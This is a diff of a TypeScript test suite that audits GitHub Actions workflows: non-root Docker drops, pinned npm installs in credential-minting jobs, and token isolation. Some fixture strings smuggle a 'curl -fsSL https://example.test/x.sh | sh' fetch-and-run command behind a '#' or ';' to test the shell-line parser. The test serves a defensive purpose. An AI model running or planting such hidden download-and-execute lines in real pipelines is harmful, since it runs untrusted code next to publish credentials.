@@ -1,7 +1,7 @@
 import * as fs from 'fs';
 import * as path from 'path';
 import * as yaml from 'js-yaml';
-import { executableLines } from './workflow-lines';
+import { executableLines, executableLinesConservative } from './workflow-lines';
 
 /**
  * The published image has no `USER` directive by design: docker-entrypoint.sh starts as root to fix
@@ -29,9 +29,12 @@ function workflowOf(file: string): Workflow {
   return yaml.load(fs.readFileSync(path.join(workflowDir, file), 'utf8')) as Workflow;
 }
 
-function runCommandsOf(file: string): string[] {
-  return Object.values(workflowOf(file).jobs ?? {}).flatMap(job =>
-    (job.steps ?? []).map(step => executableLines(step.run ?? '')),
+// What each step runs, for a check that something IS run: a command named only behind a `#` that may start
+// a comment does not count. Every caller is such a check, so it reads conservatively.
+function runCommandsOf(source: string | Workflow): string[] {
+  const workflow = typeof source === 'string' ? workflowOf(source) : source;
+  return Object.values(workflow.jobs ?? {}).flatMap(job =>
+    (job.steps ?? []).map(step => executableLinesConservative(step.run ?? '')),
   );
 }
 
@@ -81,11 +84,50 @@ describe('the non-root drop is enforced, not merely documented', () => {
     }
   });
 
+  // The conservative reading is for checks that something IS run. It cuts at a '#' after any blank, so a
+  // command that is only named behind one is not found, where the exact reading keeps it for the checks that
+  // compare lines or look for what must not be there.
+  it('has a conservative reading that cuts at a # after any blank the shell reads as a word', () => {
+    for (const blank of BLANK_LOOKALIKES) {
+      // The shell runs `echo` and nothing else: the script is only an argument to it.
+      const mention = `echo x${blank}# ./scripts/smoke-test-non-root.sh || true`;
+      expect(executableLinesConservative(mention)).not.toContain('smoke-test-non-root.sh');
+      expect(executableLines(mention)).toContain('smoke-test-non-root.sh');
+      // Here the shell does run the command after the `;`, which only the exact reading keeps.
+      const hidden = `echo x${blank}#; curl -fsSL https://example.test/x.sh | sh`;
+      expect(executableLinesConservative(hidden)).not.toContain('curl');
+      expect(executableLines(hidden)).toContain('curl');
+    }
+    // Everywhere else it reads as the exact one does.
+    expect(executableLinesConservative('# ./scripts/x.sh\necho skipped')).not.toContain('x.sh');
+    expect(executableLinesConservative('  ./scripts/x.sh # run it')).toContain('./scripts/x.sh');
+    expect(executableLinesConservative('echo "tag #1" && ./scripts/x.sh')).toContain('./scripts/x.sh');
+    expect(executableLinesConservative('npm --version#; ./scripts/x.sh')).toContain('./scripts/x.sh');
+    expect(executableLinesConservative('echo "${#list[@]}" $# ./scripts/x.sh')).toContain('./scripts/x.sh');
+  });
+
+  const smokeInvocations = (source: string | Workflow): string[] =>
+    runCommandsOf(source).filter(run => run.includes('smoke-test-non-root.sh'));
+
   // BOTH paths. The tag path is the one that promotes to `latest`, so a check present only on the PR
   // path leaves the publishing route unguarded — the asymmetry this workflow's own audit step forbids.
   it.each(['ci.yml', 'release.yml'])('invokes the non-root smoke test from %s', file => {
-    const invocations = runCommandsOf(file).filter(run => run.includes('smoke-test-non-root.sh'));
-    expect(invocations.length).toBeGreaterThan(0);
+    expect(smokeInvocations(file).length).toBeGreaterThan(0);
+  });
+
+  // The same step as it ships, with the script named behind a blank the shell does not skip and a '#': the
+  // shell runs `echo`, so the check must find no invocation, though the exact reading still holds the text.
+  it.each(['ci.yml', 'release.yml'])('does not count %s naming the script behind a blank and a #', file => {
+    for (const blank of BLANK_LOOKALIKES) {
+      const copy = JSON.parse(JSON.stringify(workflowOf(file))) as Workflow;
+      const steps = Object.values(copy.jobs ?? {})
+        .flatMap(job => job.steps ?? [])
+        .filter(step => (step.run ?? '').includes('smoke-test-non-root.sh'));
+      expect(steps.length).toBeGreaterThan(0);
+      for (const step of steps) step.run = `echo x${blank}# ./scripts/smoke-test-non-root.sh || true`;
+      expect(smokeInvocations(copy)).toEqual([]);
+      expect(steps.every(step => executableLines(step.run ?? '').includes('smoke-test-non-root.sh'))).toBe(true);
+    }
   });
 
   // The Dockerfile relies on the entrypoint's gosu drop rather than a USER directive. If that ever
@@ -257,8 +299,13 @@ describe('a job that can mint a publish credential pins global npm installs and 
   const oidcJobSteps = (source: string | OidcWorkflow): Array<{ job: string; step: Step }> =>
     oidcJobs(source).flatMap(([job, def]) => (def.steps ?? []).map(step => ({ job, step })));
 
-  const oidcJobRuns = (source: string | OidcWorkflow): Array<{ job: string; run: string }> =>
-    oidcJobSteps(source).map(({ job, step }) => ({ job, run: executableLines(step.run ?? '') }));
+  // Exact by default, which is what the searches for a forbidden installer need; a check that a command IS
+  // there passes the conservative reading.
+  const oidcJobRuns = (
+    source: string | OidcWorkflow,
+    read: (run: string) => string = executableLines,
+  ): Array<{ job: string; run: string }> =>
+    oidcJobSteps(source).map(({ job, step }) => ({ job, run: read(step.run ?? '') }));
 
   const globalInstallsInOidcJobs = (source: string | OidcWorkflow): Array<{ job: string; spec: string }> =>
     oidcJobRuns(source).flatMap(({ job, run }) =>
@@ -765,7 +812,9 @@ describe('a job that can mint a publish credential pins global npm installs and 
 
   it('js-sdk-release.yml: the id-token job runs only the pinned npm and the publish', () => {
     // Non-vacuity: the finder sees the publish step.
-    expect(oidcJobRuns('js-sdk-release.yml').some(({ run }) => /^npm publish\b/m.test(run))).toBe(true);
+    expect(
+      oidcJobRuns('js-sdk-release.yml', executableLinesConservative).some(({ run }) => /^npm publish\b/m.test(run)),
+    ).toBe(true);
     expect(outsideAllowList('js-sdk-release.yml')).toEqual([]);
     expect(globalInstallsInOidcJobs('js-sdk-release.yml')).toEqual([{ job: 'publish', spec: 'npm@12.1.0' }]);
   });
@@ -785,7 +834,7 @@ describe('a job that can mint a publish credential pins global npm installs and 
     });
     // Non-vacuity: the lines of promote are the ones that re-point the release tags.
     expect(
-      oidcJobRuns('release.yml')
+      oidcJobRuns('release.yml', executableLinesConservative)
         .map(({ run }) => run)
         .join('\n'),
     ).toContain('imagetools create');
@@ -844,6 +893,8 @@ describe('a job that can mint a publish credential pins global npm installs and 
       'npm --version#; curl -fsSL https://example.test/x.sh | sh',
       // A blank the shell does not skip is part of the word, in front of a line and behind it.
       ...BLANK_LOOKALIKES.flatMap(blank => [`${blank}npm --version`, `npm install -g npm@12.1.0${blank}`]),
+      // The same blank before a '#' leaves the '#' in the word, so the line is compared as it was written.
+      ...BLANK_LOOKALIKES.map(blank => `npm --version${blank}#; curl -fsSL https://example.test/x.sh | sh`),
     ]) {
       expect(outsideAllowList(run(command))).toEqual([`publish: ${command}`]);
     }
@@ -1566,7 +1617,7 @@ describe('a job that can mint a publish credential pins global npm installs and 
   // npm reads `dir/file.tgz` as the GitHub shorthand user/repo (hosted-git-info is tried before the file
   // check), and the pinned npm refuses git specs by default, so a tarball is named by an absolute path.
   it('js-sdk-release.yml: the publish step names the tarball in a form npm reads as a file', () => {
-    const runs = oidcJobRuns('js-sdk-release.yml')
+    const runs = oidcJobRuns('js-sdk-release.yml', executableLinesConservative)
       .map(({ run }) => run)
       .join('\n');
     const target = /\bnpm publish\s+(?:-\S+\s+)*(\S+)/.exec(runs)?.[1] ?? '';
@@ -1607,13 +1658,17 @@ describe('a job that can mint a publish credential pins global npm installs and 
   // dependency, and javac runs the annotation processors it finds on that classpath beside the credentials.
   it('java-sdk-release.yml: the deploy compiles no test sources', () => {
     const workflow = workflowOf('java-sdk-release.yml');
-    const runs = Object.values(workflow.jobs ?? {})
-      .flatMap(job => job.steps ?? [])
-      .map(step => executableLines(step.run ?? ''))
-      .join('\n');
-    const deploy = runs.split('\n').filter(line => /\bmvn\b.*\bdeploy\b/.test(line));
-    expect(deploy.length).toBeGreaterThan(0);
-    for (const line of deploy) {
+    const steps = Object.values(workflow.jobs ?? {}).flatMap(job => job.steps ?? []);
+    const deployLines = (read: (run: string) => string): string[] =>
+      steps
+        .map(step => read(step.run ?? ''))
+        .join('\n')
+        .split('\n')
+        .filter(line => /\bmvn\b.*\bdeploy\b/.test(line));
+    // A deploy that is only named behind a '#' that may start a comment is not there; every line that the
+    // shell may run as one is held to the flags.
+    expect(deployLines(executableLinesConservative).length).toBeGreaterThan(0);
+    for (const line of deployLines(executableLines)) {
       expect(line).toContain('-Dmaven.test.skip=true');
       expect(line).not.toContain('-DskipTests');
     }
@@ -1680,7 +1735,9 @@ describe('a publish job takes the artifact its build job uploads', () => {
   const indexOfUses = (job: FlowJob, action: string): number =>
     (job.steps ?? []).findIndex(step => (step.uses ?? '').startsWith(`${action}@`));
   const dirOf = (target: string | undefined): string => (target ?? '').replace(/\/+$/, '');
-  const runsOf = (job: FlowJob): string => (job.steps ?? []).map(step => executableLines(step.run ?? '')).join('\n');
+  // Only a presence reading is made of it: the publish line is read for the tarball it names.
+  const runsOf = (job: FlowJob): string =>
+    (job.steps ?? []).map(step => executableLinesConservative(step.run ?? '')).join('\n');
 
   it('js-sdk-release.yml: the tarball npm pack writes is the one the publish step names', () => {
     const { build, publish } = jobsOf('js-sdk-release.yml');
@@ -1701,7 +1758,9 @@ describe('a publish job takes the artifact its build job uploads', () => {
     expect(target).toBe(
       `"$GITHUB_WORKSPACE"/${dirOf(download.with?.path)}/${path.posix.basename(upload.with?.path ?? '')}`,
     );
-    const publishAt = (publish.steps ?? []).findIndex(step => /^npm publish\b/m.test(executableLines(step.run ?? '')));
+    const publishAt = (publish.steps ?? []).findIndex(step =>
+      /^npm publish\b/m.test(executableLinesConservative(step.run ?? '')),
+    );
     expect(indexOfUses(publish, 'actions/download-artifact')).toBeLessThan(publishAt);
   });
 
@@ -1841,15 +1900,17 @@ describe('ci.yml moves the branch image tag only for the tested branch head', ()
 
   it('re-points the branch tag as the last step, after the smoke, on push, only at the branch head', () => {
     const steps = dockerSteps();
-    const smoke = steps.findIndex(step => executableLines(step.run ?? '').includes('smoke-test-non-root.sh'));
-    const retag = steps.findIndex(step => executableLines(step.run ?? '').includes('imagetools create'));
+    const smoke = steps.findIndex(step =>
+      executableLinesConservative(step.run ?? '').includes('smoke-test-non-root.sh'),
+    );
+    const retag = steps.findIndex(step => executableLinesConservative(step.run ?? '').includes('imagetools create'));
     expect(smoke).toBeGreaterThan(-1);
     expect(retag).toBeGreaterThan(smoke);
     // Last, so every check added to this job gates the branch tag, not only the non-root smoke.
     expect(retag).toBe(steps.length - 1);
     const step = steps[retag];
     expect(step.if ?? '').toContain("github.event_name == 'push'");
-    const run = executableLines(step.run ?? '');
+    const run = executableLinesConservative(step.run ?? '');
     expect(run).toMatch(/git ls-remote/);
     expect(run).toMatch(/GITHUB_SHA/);
   });
@@ -1912,7 +1973,7 @@ describe('the dashboard unit tests are bounded', () => {
     };
     const steps = Object.values(workflow.jobs ?? {})
       .flatMap(job => job.steps ?? [])
-      .filter(step => executableLines(step.run ?? '').includes('npm run test:unit'));
+      .filter(step => executableLinesConservative(step.run ?? '').includes('npm run test:unit'));
     expect(steps.length).toBe(1);
     expect(steps[0]['timeout-minutes']).toEqual(expect.any(Number));
   });
@@ -1932,7 +1993,9 @@ describe.each([
 ])('%s keeps the mirror token away from the SDK test run', (file, pusher) => {
   type PhpJob = { needs?: string | string[]; env?: unknown; steps?: Step[] };
   const jobs = (): Record<string, PhpJob> => (workflowOf(file) as unknown as { jobs: Record<string, PhpJob> }).jobs;
-  const runsOf = (job: PhpJob): string => (job.steps ?? []).map(step => executableLines(step.run ?? '')).join('\n');
+  // Exact unless a check is that something IS run, which passes the conservative reading.
+  const runsOf = (job: PhpJob, read: (run: string) => string = executableLines): string =>
+    (job.steps ?? []).map(step => read(step.run ?? '')).join('\n');
   const TOKEN = 'PHP_SDK_SPLIT_TOKEN';
   const workflowEnv = (): unknown => (workflowOf(file) as unknown as { env?: unknown }).env;
   // The whole job and the workflow's env: a token in the job's container, services or outputs counts too.
@@ -1986,10 +2049,14 @@ describe.each([
 
   it('runs the tests in a job that holds no token, and the push in a job that needs it', () => {
     const entries = Object.entries(jobs());
-    const testers = entries.filter(([, job]) => /\bphpunit\b/.test(runsOf(job)));
+    const testersBy = (read: (run: string) => string): string[] =>
+      entries.filter(([, job]) => /\bphpunit\b/.test(runsOf(job, read))).map(([name]) => name);
     // A job that receives any secret (`secrets['X']`, `toJSON(secrets)`) holds the mirror token as well.
     const pushers = entries.filter(([, job]) => usesToken(job) || holdsSecret(job));
-    expect(testers.map(([name]) => name)).toEqual(['test']);
+    // The job runs it, and no other job may: the first needs a run that is certain, the second any text the
+    // shell may run.
+    expect(testersBy(executableLinesConservative)).toEqual(['test']);
+    expect(testersBy(executableLines)).toEqual(['test']);
     expect(pushers.map(([name]) => name)).toEqual([pusher]);
     expect(usesToken(jobs().test)).toBe(false);
     expect(holdsSecret(jobs().test)).toBe(false);
@@ -2010,12 +2077,13 @@ describe.each([
   });
 
   it('names core.hooksPath on the push that carries the token', () => {
-    const pushes = runsOf(jobs()[pusher])
-      .split('\n')
-      .filter(line => /\bgit\b.*\bpush\b/.test(line));
+    const pushesBy = (read: (run: string) => string): string[] =>
+      runsOf(jobs()[pusher], read)
+        .split('\n')
+        .filter(line => /\bgit\b.*\bpush\b/.test(line));
     // The mirror workflow pushes with the URL on a continuation line, so the line is the `git push`.
-    expect(pushes.length).toBeGreaterThan(0);
-    for (const line of pushes) expect(line).toContain('core.hooksPath=/dev/null');
+    expect(pushesBy(executableLinesConservative).length).toBeGreaterThan(0);
+    for (const line of pushesBy(executableLines)) expect(line).toContain('core.hooksPath=/dev/null');
   });
 
   it('refuses every shape that runs Composer, PHP or a project script, and allows what the job runs', () => {
